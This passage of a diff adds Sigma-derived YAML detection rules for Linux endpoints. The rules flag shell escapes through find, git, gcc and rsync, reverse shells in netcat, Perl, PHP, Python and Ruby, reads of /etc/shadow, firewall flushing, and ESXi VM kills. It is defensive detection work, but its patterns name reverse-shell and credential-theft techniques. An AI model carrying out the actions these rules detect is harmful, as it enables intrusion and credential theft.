+    - field: extra.CommandLine
+      op: contains
+      value: vm process
+    - field: extra.CommandLine
+      op: endswith
+      value: ' list'
+    condition_logic: and
+  mitre_technique_id: T1033
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-e2ea79e5
+  title: ESXi VM Kill Via ESXCLI
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects execution of the "esxcli" command with the "vm" and "kill"
+    flag in order to kill/shutdown a specific VM.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /esxcli
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - vm process
+      - kill
+    condition_logic: and
+  mitre_technique_id: T1059.012
+  mitre_tactic: impact
+  flag: suspicious_process
+- id: lr-sigma-imported-31d01211
+  title: ESXi VSAN Information Discovery Via ESXCLI
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects execution of the "esxcli" command with the "vsan" flag in order
+    to retrieve information about virtual storage. Seen used by malware such as DarkSide.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /esxcli
+    - field: extra.CommandLine
+      op: contains
+      value: vsan
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - ' get'
+      - ' list'
+    condition_logic: and
+  mitre_technique_id: T1033
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-4142ed86
+  title: File and Directory Discovery - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: informational
+  description: Detects usage of system utilities such as "find", "tree", "findmnt",
+    etc, to discover files, directories and network shares.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /file
+    - field: extra.CommandLine
+      op: re
+      value: (.){200,}
+    - field: extra.NewProcessName
+      op: endswith
+      value: /ls
+    - field: extra.CommandLine
+      op: contains
+      value: -R
+    - field: extra.NewProcessName
+      op: endswith
+      value: /find
+    - field: extra.NewProcessName
+      op: endswith
+      value: /tree
+    - field: extra.NewProcessName
+      op: endswith
+      value: /findmnt
+    - field: extra.NewProcessName
+      op: endswith
+      value: /mlocate
+    condition_logic: or
+  mitre_technique_id: T1083
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-5d7bbc7e
+  title: File Deletion
+  source: sigma
+  log_type: linux_endpoint
+  severity: informational
+  description: Detects file deletion using "rm", "shred" or "unlink" commands which
+    are used often by adversaries to delete files left behind by the actions of their
+    intrusion activity
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /rm
+      - /shred
+      - /unlink
+    condition_logic: and
+  mitre_technique_id: T1070.004
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-b2b0e6ec
+  title: Shell Execution via Find - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects the use of the find command to execute a shell. Such behavior
+    may be associated with privilege escalation, unauthorized command execution, or
+    exploitation attempt.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /find
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - ' . '
+      - -exec
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - /bin/bash
+      - /bin/dash
+      - /bin/fish
+      - /bin/sh
+      - /bin/zsh
+    condition_logic: and
+  mitre_technique_id: T1083
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-9210be3a
+  title: Shell Execution via Flock - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects the use of the "flock" command to execute a shell. Such behavior
+    may be associated with privilege escalation, unauthorized command execution, or
+    to break out from restricted environments.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /flock
+    - field: extra.CommandLine
+      op: contains
+      value: ' -u '
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - /bin/bash
+      - /bin/dash
+      - /bin/fish
+      - /bin/sh
+      - /bin/zsh
+    condition_logic: and
+  mitre_technique_id: T1083
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-5f41a96a
+  title: Shell Execution GCC  - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects the use of the "gcc" utility to execute a shell. Such behavior
+    may be associated with privilege escalation, unauthorized command execution, or
+    to break out from restricted environments.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /c89
+      - /c99
+      - /gcc
+    - field: extra.CommandLine
+      op: contains
+      value: -wrapper
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - /bin/bash,-s
+      - /bin/dash,-s
+      - /bin/fish,-s
+      - /bin/sh,-s
+      - /bin/zsh,-s
+    condition_logic: and
+  mitre_technique_id: T1083
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-258bdfc4
+  title: Shell Execution via Git - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects the use of the "git" utility to execute a shell. Such behavior
+    may be associated with privilege escalation, unauthorized command execution, or
+    to break out from restricted environments.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.ParentProcessName
+      op: endswith
+      value: /git
+    - field: extra.ParentCommandLine
+      op: contains_all
+      values:
+      - ' -p '
+      - help
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - bash 0<&1
+      - dash 0<&1
+      - sh 0<&1
+    condition_logic: and
+  mitre_technique_id: T1059
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-89fc72f5
+  title: OS Architecture Discovery Via Grep
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects the use of grep to identify information about the operating
+    system architecture. Often combined beforehand with the execution of "uname" or
+    "cat /proc/cpuinfo"
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /grep
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - aarch64
+      - arm
+      - i386
+      - i686
+      - mips
+      - x86_64
+    condition_logic: and
+  mitre_technique_id: T1082
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-096b2e9b
+  title: Group Has Been Deleted Via Groupdel
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects execution of the "groupdel" binary. Which is used to delete
+    a group. This is sometimes abused by threat actors in order to cover their tracks
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /groupdel
+    condition_logic: and
+  mitre_technique_id: T1531
+  mitre_tactic: impact
+  flag: suspicious_process
+- id: lr-sigma-imported-8070de84
+  title: Install Root Certificate
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects installation of new certificate on the system which attackers
+    may use to avoid warnings when connecting to controlled web servers or C2s
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /update-ca-certificates
+      - /update-ca-trust
+    condition_logic: and
+  mitre_technique_id: T1553.004
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-ae1cb5b5
+  title: Suspicious Package Installed - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects installation of suspicious packages using system installation
+    utilities
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - nmap
+      - ' nc'
+      - netcat
+      - wireshark
+      - tshark
+      - openconnect
+      - proxychains
+      - socat
+    condition_logic: and
+  mitre_technique_id: T1553.004
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-c68beef1
+  title: Flush Iptables Ufw Chain
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detect use of iptables to flush all firewall rules, tables and chains
+    and allow all network traffic
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /iptables
+      - /xtables-legacy-multi
+      - /iptables-legacy-multi
+      - /ip6tables
+      - /ip6tables-legacy-multi
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - -F
+      - -Z
+      - -X
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - ufw-logging-deny
+      - ufw-logging-allow
+      - ufw6-logging-deny
+      - ufw6-logging-allow
+    condition_logic: and
+  mitre_technique_id: T1562.004
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-9c2d141f
+  title: Local System Accounts Discovery - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects enumeration of local system accounts. This information can
+    help adversaries determine which local accounts exist on a system to aid in follow-on
+    behavior.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /lastlog
+    - field: extra.CommandLine
+      op: contains
+      value: '''x:0:'''
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /cat
+      - /ed
+      - /head
+      - /more
+      - /nano
+      - /tail
+      - /vi
+      - /vim
+      - /less
+      - /emacs
+      - /sqlite3
+      - /makemap
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - /etc/passwd
+      - /etc/shadow
+      - /etc/sudoers
+      - /etc/spwd.db
+      - /etc/pwd.db
+      - /etc/master.passwd
+    - field: extra.NewProcessName
+      op: endswith
+      value: /id
+    - field: extra.NewProcessName
+      op: endswith
+      value: /lsof
+    - field: extra.CommandLine
+      op: contains
+      value: -u
+    condition_logic: or
+  mitre_technique_id: T1087.001
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-60e57768
+  title: Local Groups Discovery - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects enumeration of local system groups. Adversaries may attempt
+    to find local system groups and permission settings
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /groups
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /cat
+      - /ed
+      - /head
+      - /less
+      - /more
+      - /nano
+      - /tail
+      - /vi
+      - /vim
+    - field: extra.CommandLine
+      op: contains
+      value: /etc/group
+    condition_logic: or
+  mitre_technique_id: T1069.001
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-f2f265b2
+  title: Potential GobRAT File Discovery Via Grep
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects the use of grep to discover specific files created by the GobRAT
+    malware
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /grep
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - apached
+      - frpc
+      - sshd.sh
+      - zone.arm
+    condition_logic: and
+  mitre_technique_id: T1082
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-42829e88
+  title: Named Pipe Created Via Mkfifo
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects the creation of a new named pipe using the "mkfifo" utility
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /mkfifo
+    condition_logic: and
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-9fce342c
+  title: Potentially Suspicious Named Pipe Created Via Mkfifo
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects the creation of a new named pipe using the "mkfifo" utility
+    in a potentially suspicious location
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /mkfifo
+    - field: extra.CommandLine
+      op: contains
+      value: ' /tmp/'
+    condition_logic: and
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-2b6faf89
+  title: Mount Execution With Hidepid Parameter
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects execution of the "mount" command with "hidepid" parameter to
+    make invisible processes to other users from the system
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /mount
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - hidepid=2
+      - ' -o '
+    condition_logic: and
+  mitre_technique_id: T1564
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-15d6c0ca
+  title: Potential Netcat Reverse Shell Execution
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects execution of netcat with the "-e" flag followed by common shells.
+    This could be a sign of a potential reverse shell setup.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /nc
+      - /ncat
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - ' -c '
+      - ' -e '
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - ' ash'
+      - ' bash'
+      - ' bsh'
+      - ' csh'
+      - ' ksh'
+      - ' pdksh'
+      - ' sh'
+      - ' tcsh'
+      - /bin/ash
+      - /bin/bash
+      - /bin/bsh
+      - /bin/csh
+      - /bin/ksh
+      - /bin/pdksh
+      - /bin/sh
+      - /bin/tcsh
+      - /bin/zsh
+      - $IFSash
+      - $IFSbash
+      - $IFSbsh
+      - $IFScsh
+      - $IFSksh
+      - $IFSpdksh
+      - $IFSsh
+      - $IFStcsh
+      - $IFSzsh
+    condition_logic: and
+  mitre_technique_id: T1059
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-56d4b35e
+  title: Shell Execution via Nice - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects the use of the "nice" utility to execute a shell. Such behavior
+    may be associated with privilege escalation, unauthorized command execution, or
+    to break out from restricted environments.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /nice
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - /bin/bash
+      - /bin/dash
+      - /bin/fish
+      - /bin/sh
+      - /bin/zsh
+    condition_logic: and
+  mitre_technique_id: T1083
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-4d6e84ed
+  title: Nohup Execution
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects usage of nohup which could be leveraged by an attacker to keep
+    a process running or break out from restricted environments
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /nohup
+    condition_logic: and
+  mitre_technique_id: T1059.004
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-74411b85
+  title: Suspicious Nohup Execution
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects execution of binaries located in potentially suspicious locations
+    via "nohup"
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /nohup
+    - field: extra.CommandLine
+      op: contains
+      value: /tmp/
+    condition_logic: and
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-f16c8bbc
+  title: OMIGOD SCX RunAsProvider ExecuteScript
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Rule to detect the use of the SCX RunAsProvider ExecuteScript to execute
+    any UNIX/Linux script using the /bin/sh shell. Script being executed gets created
+    as a temp file in /tmp folder with a [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: username
+      op: contains
+      value: root
+    - field: extra.LogonId
+      op: contains
+      value: '0'
+    - field: extra.CurrentDirectory
+      op: contains
+      value: /var/opt/microsoft/scx/tmp
+    - field: extra.CommandLine
+      op: contains
+      value: /etc/opt/microsoft/scx/conf/tmpdir/scx
+    condition_logic: and
+  mitre_technique_id: T1068
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-825f6541
+  title: OMIGOD SCX RunAsProvider ExecuteShellCommand
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Rule to detect the use of the SCX RunAsProvider Invoke_ExecuteShellCommand
+    to execute any UNIX/Linux command using the /bin/sh shell. SCXcore, started as
+    the Microsoft Operations Manager [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: username
+      op: contains
+      value: root
+    - field: extra.LogonId
+      op: contains
+      value: '0'
+    - field: extra.CurrentDirectory
+      op: contains
+      value: /var/opt/microsoft/scx/tmp
+    - field: extra.CommandLine
+      op: contains
+      value: /bin/sh
+    condition_logic: and
+  mitre_technique_id: T1068
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-7da88b67
+  title: Potential Perl Reverse Shell Execution
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects execution of the perl binary with the "-e" flag and common
+    strings related to potential reverse shell activity
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /perl
+    - field: extra.CommandLine
+      op: contains
+      value: ' -e '
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - fdopen(
+      - ::Socket::INET
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - Socket
+      - connect
+      - open
+      - exec
+    condition_logic: and
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-ce97a6dd
+  title: Potential PHP Reverse Shell
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects usage of the PHP CLI with the "-r" flag which allows it to
+    run inline PHP code. The rule looks for calls to the "fsockopen" function which
+    allows the creation of sockets. Attackers often [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains
+      value: /php
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - ' -r '
+      - fsockopen
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - ash
+      - bash
+      - bsh
+      - csh
+      - ksh
+      - pdksh
+      - sh
+      - tcsh
+      - zsh
+    condition_logic: and
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-fb579b18
+  title: Pnscan Binary Data Transmission Activity
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects command line patterns associated with the use of Pnscan for
+    sending and receiving binary data across the network. This behavior has been identified
+    in a Linux malware campaign targeting [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.CommandLine
+      op: re
+      value: -(W|R)\s?(\s|"|')([0-9a-fA-F]{2}\s?){2,20}(\s|"|')
+    condition_logic: and
+  mitre_technique_id: T1046
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-53c184ec
+  title: Connection Proxy
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects setting proxy configuration
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - http_proxy=
+      - https_proxy=
+    condition_logic: and
+  mitre_technique_id: T1090
+  mitre_tactic: command-and-control
+- id: lr-sigma-imported-12e744d4
+  title: PUA - TruffleHog Execution - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects execution of TruffleHog, a tool used to search for secrets
+    in different platforms like Git, Jira, Slack, SharePoint, etc. that could be used
+    maliciously. While it is a legitimate tool, [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /trufflehog
+    condition_logic: or
+  mitre_technique_id: T1083
+  mitre_tactic: credential-access
+  flag: credential_access
+- id: lr-sigma-imported-2d17152f
+  title: Python WebServer Execution - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects the execution of Python web servers via command line interface
+    (CLI). After gaining access to target systems, adversaries may use Python's built-in
+    HTTP server modules to quickly [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /python
+      - /python2
+      - /python3
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /python2.
+      - /python3.
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - http.server
+      - SimpleHTTPServer
+    condition_logic: and
+  mitre_technique_id: T1048.003
+  mitre_tactic: exfiltration
+  flag: data_exfil_candidate
+- id: lr-sigma-imported-351d801e
+  title: Python Spawning Pretty TTY Via PTY Module
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects a python process calling to the PTY module in order to spawn
+    a pretty tty which could be indicative of potential reverse shell activity.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /python
+      - /python2
+      - /python3
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /python2.
+      - /python3.
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - import pty
+      - 'from pty '
+    - field: extra.CommandLine
+      op: contains
+      value: spawn
+    condition_logic: and
+  mitre_technique_id: T1059
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-c8b30be2
+  title: Python Reverse Shell Execution Via PTY And Socket Modules
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects the execution of python with calls to the socket and pty module
+    in order to connect and spawn a potential reverse shell.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains
+      value: python
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - ' -c '
+      - import
+      - pty
+      - socket
+      - spawn
+      - .connect
+    condition_logic: and
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-b5f8b60c
+  title: Inline Python Execution - Spawn Shell Via OS System Library
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects execution of inline Python code via the "-c" in order to call
+    the "system" function from the "os" library, and spawn a shell.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /python
+      - /python2
+      - /python3
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /python2.
+      - /python3.
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - ' -c '
+      - os.system(
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - /bin/bash
+      - /bin/dash
+      - /bin/fish
+      - /bin/sh
+      - /bin/zsh
+    condition_logic: and
+  mitre_technique_id: T1059
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-a5bb9736
+  title: Remote Access Tool - Team Viewer Session Started On Linux Host
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects the command line executed when TeamViewer starts a session
+    started by a remote host. Once a connection has been started, an investigator
+    can verify the connection details by viewing the [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.ParentProcessName
+      op: endswith
+      value: /TeamViewer_Service
+    - field: extra.NewProcessName
+      op: endswith
+      value: /TeamViewer_Desktop
+    - field: extra.CommandLine
+      op: endswith
+      value: /TeamViewer_Desktop --IPCport 5939 --Module 1
+    condition_logic: and
+  mitre_technique_id: T1133
+  mitre_tactic: initial-access
+  flag: injection_attempt
+- id: lr-sigma-imported-d632e354
+  title: Linux Remote System Discovery
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects the enumeration of other remote systems.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /arp
+    - field: extra.CommandLine
+      op: contains
+      value: -a
+    - field: extra.NewProcessName
+      op: endswith
+      value: /ping
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - ' 10.'
+      - ' 192.168.'
+      - ' 172.16.'
+      - ' 172.17.'
+      - ' 172.18.'
+      - ' 172.19.'
+      - ' 172.20.'
+      - ' 172.21.'
+      - ' 172.22.'
+      - ' 172.23.'
+      - ' 172.24.'
+      - ' 172.25.'
+      - ' 172.26.'
+      - ' 172.27.'
+      - ' 172.28.'
+      - ' 172.29.'
+      - ' 172.30.'
+      - ' 172.31.'
+      - ' 127.'
+      - ' 169.254.'
+    condition_logic: or
+  mitre_technique_id: T1018
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-4b7a1cbe
+  title: Linux Package Uninstall
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects linux package removal using builtin tools such as "yum", "apt",
+    "apt-get" or "dpkg".
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /yum
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - erase
+      - remove
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /apt
+      - /apt-get
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - remove
+      - purge
+    - field: extra.NewProcessName
+      op: endswith
+      value: /dpkg
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - '--remove '
+      - ' -r '
+    - field: extra.NewProcessName
+      op: endswith
+      value: /rpm
+    - field: extra.CommandLine
+      op: contains
+      value: ' -e '
+    condition_logic: or
+  mitre_technique_id: T1070
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-c3feffa8
+  title: Shell Execution via Rsync - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects the use of the "rsync" utility to execute a shell. Such behavior
+    may be associated with privilege escalation, unauthorized command execution, or
+    to break out from restricted environments.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /rsync
+      - /rsyncd
+    - field: extra.CommandLine
+      op: contains
+      value: ' -e '
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - '/ash '
+      - '/bash '
+      - '/dash '
+      - '/csh '
+      - '/sh '
+      - '/zsh '
+      - '/tcsh '
+      - '/ksh '
+      - '''ash '
+      - '''bash '
+      - '''dash '
+      - '''csh '
+      - '''sh '
+      - '''zsh '
+      - '''tcsh '
+      - '''ksh '
+    condition_logic: and
+  mitre_technique_id: T1059
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-1fe78190
+  title: Suspicious Invocation of Shell via Rsync
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects the execution of a shell as sub process of "rsync" without
+    the expected command line flag "-e" being used, which could be an indication of
+    exploitation as described in CVE-2024-12084. [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.ParentProcessName
+      op: contains_any
+      values:
+      - /rsync
+      - /rsyncd
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /ash
+      - /bash
+      - /csh
+      - /dash
+      - /ksh
+      - /sh
+      - /tcsh
+      - /zsh
+    condition_logic: and
+  mitre_technique_id: T1059
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-ff16611e
+  title: Potential Ruby Reverse Shell
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects execution of ruby with the "-e" flag and calls to "socket"
+    related functions. This could be an indication of a potential attempt to setup
+    a reverse shell
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains
+      value: ruby
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - ' -e'
+      - rsocket
+      - TCPSocket
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - ' ash'
+      - ' bash'
+      - ' bsh'
+      - ' csh'
+      - ' ksh'
+      - ' pdksh'
+      - ' sh'
+      - ' tcsh'
+    condition_logic: and
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-2e0b1691
+  title: Scheduled Cron Task/Job - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects abuse of the cron utility to perform task scheduling for initial
